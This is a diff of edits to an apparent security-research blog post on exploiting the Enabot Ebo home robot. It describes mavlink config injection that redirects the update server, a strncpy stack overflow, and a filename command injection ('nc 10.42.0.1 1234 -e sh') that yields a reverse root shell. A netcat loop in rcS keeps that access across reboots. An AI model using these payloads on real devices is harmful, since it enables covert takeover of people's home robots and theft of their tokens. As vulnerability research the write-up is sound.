@@ -358,19 +358,17 @@ Somehow we were completely overwriting and creating our own values in the ebo.cf
 
 We can see that it's grabbing the ```server-domain``` parameter from the config as part of the handleUpgradeRequest function. This was perfect because if we could overwrite the config to point to own own server, we could also trigger an upgrade from one of the mavlink commands that we mentioned earlier in the fuzzing sections. This would allow us to send alot more input that it doesn't expect, and install a rootkit onto the device if we could send it a fake download file.
 
-First, we had to figure out how to successfully overwrite the config. After some testing from our ebo server, we figured out that the mavlink branch that was overwriting config values as 0xe5. At a certain offset after the start of the mavlink branch, it would look for a string that it would use to add to the config. The format was supposed to be 
-
-config_header-header_parameter. So say you wanted to add a time parameter to the video header, you would send video-time. Then it would grab a value from later down in the packet to put at the value for the paramter. Here is an example of them setting the timezone config. 
+First, we had to figure out how to successfully overwrite the config. After some testing from our ebo server, we figured out that the mavlink branch that was overwriting config values is 0xe5. At a certain offset after the start of the mavlink branch, it would look for a string that it would use to add to the config. The format was supposed to be `config_header - header_parameter`. So say you wanted to add a time parameter to the video header, you would send `video - time`. Then it would grab a value from later down in the packet to put at the value for the paramter. Here is an example of them setting the timezone config. 
 
 <p style="text-align:center;"><img src="/assets/enabot_part3/timezone_modify.png" alt="ebocontrol" style="height: 50%; width:50%;"/></p>
 
-We see that they use the time header and the timezone paramter to select what they want to change in the config though.They use the branch value 0xe2, but that was only allowing them to modify an already existing value with an integer, which wasn't going to work for us because we had to use a string. With the branch value 0xe5, we could add new config values, but not modify existing ones, and it still didn't let us send strings. We also found out that if we tried to add a duplicate entry to an already existing parameter, it would be placed below the original one, and wouldn't get used. We were able to get around all of this using newlines though.
+We see that they use the time header and the timezone paramter to select what they want to change in the config though. They use the branch value `0xe2`, but that was only allowing them to modify an already existing value with an integer, which wasn't going to work for us because we had to use a string. With the branch value `0xe5`, we could add new config values, but not modify existing ones, and it still didn't let us send strings. We also found out that if we tried to add a duplicate entry to an already existing parameter, it would be placed below the original one, and wouldn't get used. We were able to get around all of this using newlines though.
 
 The config file has no fancy format. It's just square brackets for the headers, and newlines and equals signs for the parameters. We were able to send the following string in the packet to modify the config.
 
 ```server-a = b\ndomain = 10.42.0.1\ncccccc```
 
-First the specify the server header. Then we send ```a = b\n```. We found out that the parameters were being placed in alphabetical order, so by specifying a as the first parameter, it would be placed at the top of the server portion of the config. Then because of the newline, we can specify ```domain = 10.42.0.1\n```, which sets the server domain to point to our local ip where we can host own own server and gets placed on its own line in the config. Finally we end the string with random garbage characters. This allows a the line after the domain to eat up the = "value" portion that gets placed automatically, so in the config it becomes c = nan because we didn't pass a valid value to it.
+First the specify the server header. Then we send ```a = b\n```. We found out that the parameters were being placed in alphabetical order, so by specifying a as the first parameter, it would be placed at the top of the server portion of the config. Then because of the newline, we can specify ```domain = 10.42.0.1\n```, which sets the server domain to point to our local ip where we can host own own server and gets placed on its own line in the config. Finally we end the string with random garbage characters. This allows the line after the domain to eat up the = "value" portion that gets placed automatically, so in the config it becomes c = nan because we didn't pass a valid value to it.
 
 We send a config packet with that string, and a config packet with this string
 
@@ -388,7 +386,11 @@ Now for some reason even after sending an update it still uses the original conf
 <p style="text-align:center;"><img src="/assets/enabot_part3/post_reboot_config.png" alt="ebocontrol" style="height: 50%; width:50%;"/></p>
 
 
-Conviently one of the mavlink commands also can trigger a soft reboot where the device reboots silently. So we can modify the config, reboot the device, and when we trigger and update, it'll reach back to our server. At the time of writing this, we just realized they misspelled "protocol" in the config. It must default to use the port when they normally update. We could still overwrite it, but it isn't necessary as we still are getting http requests. In the next section we'll go over how we were able to exploit the device once it reached back to our server once we had changed the config.
+Conviently one of the mavlink commands also can trigger a soft reboot where the device reboots silently. So we can modify the config, reboot the device, and when we trigger and update, it'll reach back to our server. 
+
+> At the time of writing this, we just realized they misspelled "protocol" in the config. It must default to use the port when they normally update. We could still overwrite it, but it isn't necessary as we still are getting http requests. 
+
+In the next section we'll go over how we were able to exploit the device once it reached back to our server once we had changed the config.
 
 
 
@@ -397,20 +399,20 @@ Conviently one of the mavlink commands also can trigger a soft reboot where the 
 
 Ultimately we wanted a shell on the device. This way we could get a shell, steal the saved server token, install something malicious in the firmware, and then place the token back on the device without there being a trace of what happened. This way we could access the device at any time with a reverse shell and be able to use the ebo server, etc. and the owner would have no clue.
 
-We'll go over the path of an upgrade to help better understand how we were able to exploit this vulnerability. First when we triggered an upgrade using the mavlink branch value ```0xcd```, we hit this section of the code where it enters handleUartUpgradeRequest.
+We'll go over the path of an upgrade to help better understand how we were able to exploit this vulnerability. First, when we triggered an upgrade using the mavlink branch value ```0xcd```, we hit this section of the code where it enters `handleUartUpgradeRequest`.
 
 <p style="text-align:center;"><img src="/assets/enabot_part3/handle_uart_upgrade_request.png" alt="ebocontrol" style="height: 70%; width:70%;"/></p>
 
 It would enter that function, and we would see all the config prints for the upgrade in the logs, and then it reached the end of that function it would create an ```FZ_Upgrade_Thread```
 
-Once inside of this function, it would continue down and create 2 more threads. The one we care about is the ```FZ_FileDownload_Thread```. This is the thread that we perform our initial exploit. Inside of this thread we hit the ```Getresource_domain``` function. This function allows he device reaches out to the server to see what url it should download the upgrade file from.
+Once inside of this function, it would continue down and create 2 more threads. The one we care about is the ```FZ_FileDownload_Thread```. This is the thread that we perform our initial exploit. Inside of this thread we hit the ```Getresource_domain``` function. This function allows the device to reach out to the server to see what url it should download the upgrade file from.
 
 <p style="text-align:center;"><img src="/assets/enabot_part3/first_request.png" alt="ebocontrol" style="height: 70%; width:70%;"/></p>
 
 
-It sends a POST request to the server and in the response it checks for ```HTTP/1.1 302 Found```. After that it checks for ```Location: ```. It will then strncpy all the data after location up until it sees a newline character. We tested this an were actually able to [overwrite the return address](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/stack-based-buffer-overflow) to the function call above since the destination in the ```strncpy``` is a pointer to the stack from function above. We weren't able to exploit it because we didn't have a leak and the device has aslr enabled. If we had a leak we could've created a [ROPchain](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming) to spawn a netcat listener  We also didn't need to cause we had a vision for where we could perform a command injection.
+It sends a `POST` request to the server and in the response it checks for ```HTTP/1.1 302 Found```. After that it checks for ```Location: ```. It will then strncpy all the data after location up until it sees a newline character. We tested this an were actually able to [overwrite the return address](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/stack-based-buffer-overflow) to the function call above since the destination in the ```strncpy``` is a pointer to the stack from function above. We weren't able to exploit it because we didn't have a leak and the device has ASLR enabled. If we had a leak we could've created a [ROPchain](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming) to spawn a netcat listener. In the end, we didn't need to do this, because we had a vision for where we could perform a command injection.
 
-Instead we just respond that the ```Location:``` it should download the firmware from is our server's url.
+Instead, we just replace the ```Location:``` value. It should download the firmware from our server's url.
 
 We return from that function and then hit the ```FZ_Get_Remote_File``` in the ```Fz_FileDownload_Thread``` function seen from above.
 
@@ -427,17 +429,15 @@ After the snprintf, the command would like something like this
 
 Once that string hit the system command, it would tar up the linuxrc into a file called file.tar.
 
+Then it would hit the semicolon indicating its running a different shell command. It would try to connect to our server while opening a shell for us to communicate with if the connection suceeds. Then we could have a netcat listener running and be able to have complete access to the device once it connects.
 
-Then it would hit the semicolon indicating its running a different shell command. It would try to connect to our server while opening a shell for us to communicate with if the connection suceeds. Then we could have a netcat listener running on our computer and be able to have complete access to the device once it connects.
+After we close the netcat connection, it would hit the next semicolon indicating it should run the next shell command with the -C option which would just list the directory with an empty color command
 
-Then after we close the netcat connection, it would hit the next semicolon indicating it should run the next shell command with the -C option which would just list the directory with an empty color command
-
-Regardless of if the tar or ls commands failed, the netcat listener would still open, but it's nice to make everything execute cleanly when possible. To get to this command injection we first had to enter the ```GetFile_updatefile``` function.
+Regardless of if the `tar` or `ls` commands failed, the netcat listener would still open, but it's nice to make everything execute cleanly when possible. To get to this command injection we first had to enter the ```GetFile_updatefile``` function.
 
 <p style="text-align:center;"><img src="/assets/enabot_part3/update_file.png" alt="ebocontrol" style="height: 80%; width:80%;"/></p>
 
-
-It first makes sure that the url contains ```https://```. Then it reads the url until the first `/` character. It then uses that URL and makes a GET request to it.
+It first makes sure that the url contains ```https://```. Then it reads the url until the first `/` character. It then uses that URL and makes a `GET` request to it.
 
 <p style="text-align:center;"><img src="/assets/enabot_part3/get_response.png" alt="ebocontrol" style="height: 80%; width:80%;"/></p>
 
@@ -457,7 +457,7 @@ Once it validates the response contains all these parameters, it will open a fil
 
 To validate the file was transferred successfully, it calculates the md5sum and validates it matches the ```md5_token=``` value we sent in the GET response.
 
-To do the command injection in our get response we send this as the filename
+To do the command injection in our `GET` response we send this as the filename
 
 ```filename=file;nc 10.42.0.1 1234 -e sh;#.tar```
 
@@ -469,7 +469,7 @@ First the md5sum will fail. Then it will run the netcat command while we have ou
 
 When an upgrade fails, the device reboots and still has the original firmware on it. However, since we have a reverse root shell, we can simply overwrite the [mtd blocks](https://www.oreilly.com/library/view/mastering-embedded-linux/9781787283282/64271306-bd52-47d8-8118-6b618630d307.xhtml) on the device and have persistent access to the device across reboots. We can modify the [rcS](https://www.thegeekyway.com/whats-important-init-d-directory-linux/) file to start a netcat listener on boot.
 
-We did a bit more reversing and figured out what happens when it does a firmware upgrade. When it receives the tar file, it untars it and it contains a bunch of squash filesystems. Each filesystem is then reprogrammed onto a mtd block in /dev. We defined a custom struct in binary ninja and it shows nicely which mtd block lines up with which filesystem.
+We did a bit more reversing and figured out what happens when it does a firmware upgrade. When it receives the tar file, it untars it and it contains a bunch of squash filesystems. Each filesystem is then reprogrammed onto a `mtd` partition in /dev. `mtd` partitions are typically used for embedded devices with flash memory. So when we overwrite these it is persistent. We defined a custom struct in binary ninja and it shows nicely which mtd block lines up with which filesystem.
 
 <p style="text-align:center;"><img src="/assets/enabot_part3/squashfs.png" alt="ebocontrol" style="height: 70%; width:70%;"/></p>
 
@@ -492,8 +492,6 @@ do
         sleep 5
 done
 ```
-
-The & in the rcS will run the script in the background so that it is always running without interuptting anything else.
 
 The hello file will constantly be trying to connect back to our host machine, and redirect any errors to /dev/null so that they do not get printed.
 
@@ -631,7 +629,7 @@ Now we can reboot the device and hope it works! We wait until its fully booted a
 
 <p style="text-align:center;"><img src="/assets/enabot_part3/netcat_success.png" alt="ebocontrol" style="height: 50%; width:50%;"/></p>
 
-And it worked! We connected and ran ```ps -A | grep hello``` to show that the hello script is running in the background. We were happy it worked too cause if it didn't it may have been bricked till we took the chip off and reprogrammed it manually.
+And it worked! We connected and ran ```ps -A | grep hello``` to show that the hello script is running in the background. We were happy it worked too because if it didn't it may have been bricked till we took the chip off and reprogrammed it manually with the original firmware.
 
 From here on out, as long as the ebo is on, it will be attempting to connect to our host computer where we can then have complete access to it.
 
